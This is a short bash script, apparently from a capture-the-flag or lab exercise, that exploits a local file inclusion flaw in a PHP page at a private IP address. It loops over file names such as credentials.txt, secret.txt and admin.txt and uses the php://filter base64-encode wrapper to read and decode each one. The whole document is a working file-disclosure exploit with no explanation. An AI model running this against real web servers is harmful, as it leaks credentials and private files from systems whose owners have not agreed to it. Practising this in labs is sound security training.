for file in user.txt flag.txt note.txt secret.txt admin.txt credentials.txt; do
  echo "[*] Trying $file"
  curl -s "http://10.10.207.200/secret-script.php?file=php://filter/convert.base64-encode/resource=$file" | base64 -d && echo
done

